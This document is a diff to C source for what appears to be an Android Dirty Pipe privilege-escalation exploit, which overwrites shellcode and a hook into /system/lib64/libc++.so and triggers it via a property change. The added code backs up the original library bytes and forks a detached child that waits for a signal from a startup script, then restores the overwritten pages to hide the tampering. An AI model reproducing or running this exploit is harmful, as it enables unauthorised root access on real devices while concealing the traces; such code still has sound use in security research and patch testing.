@@ -173,6 +173,8 @@ $ llvm-objdump -TC libc++.so
 Mangled: _ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev
 */
 
+void sighandler_empty(int a){}
+
 int main(int argc, char **argv)
 {
 	const char *stage1_lib = "/system/lib64/libc++.so";
@@ -218,6 +220,27 @@ int main(int argc, char **argv)
 		return EXIT_FAILURE;
 	}
 
+	// Backup original content.
+	char *stage2_backup = (char *)malloc(STAGE2_PAGES * PAGE_SIZE);
+	if(read(fd2, stage2_backup, STAGE2_PAGES * PAGE_SIZE) < 0){
+		perror("read backup stage2");
+	}
+	char *stage1_backup = (char *)malloc(stage1_len);
+	if(lseek64(fd1, shellcode_offset, SEEK_SET) < 0){
+		perror("lseek64");
+	}
+	if(read(fd1, stage1_backup, stage1_len) < 0){
+		perror("read backup stage1");
+	}
+
+	if(lseek64(fd1, hook_offset, SEEK_SET) < 0){
+		perror("lseek64");
+	}
+	uint32_t hook_backup = 0;
+	if(read(fd1, &hook_backup, hook_data_size) < 0){
+		perror("read backup hook");
+	}
+
 	/* create the pipe with all flags initialized with
 	   PIPE_BUF_FLAG_CAN_MERGE */
 	int p[2];
@@ -233,6 +256,41 @@ int main(int argc, char **argv)
 
 	// Trigger
 	system("setprop a a");
+
+	signal(SIGCHLD, SIG_IGN);
+
+	if(fork() == 0){
+		// Disconnect child from adb shell.
+		setsid();
+		close(0);
+		close(1);
+		close(2);
+
+		signal(SIGHUP, SIG_IGN);
+		// The default action of SIGUSR1 is termination of process. We don't like it.
+		signal(SIGUSR1, sighandler_empty);
+
+		// SIGUSR1 will be sent by startup-script to notify completion of exploit
+		sigset_t set;
+		sigemptyset(&set);
+		sigaddset(&set, SIGHUP);
+		sigaddset(&set, SIGINT);
+		sigaddset(&set, SIGTERM);
+		sigaddset(&set, SIGKILL);
+		sigaddset(&set, SIGUSR1);
+		int sig;
+		int ret = sigwait(&set, &sig);
+
+		// Restore stage1
+		overwrite(p, fd1, hook_offset, (char*)&hook_backup, hook_data_size);
+		overwrite(p, fd1, shellcode_offset, stage1_backup, stage1_len);
+		// Restore stage2
+		for(int i = 0; i < STAGE2_PAGES; i++){
+			overwrite(p, fd2, i * PAGE_SIZE + 1, stage2_backup + i * PAGE_SIZE + 1, PAGE_SIZE - 1);
+		}
+
+		exit(0);
+	}
 
 	printf("It worked!\n");
 
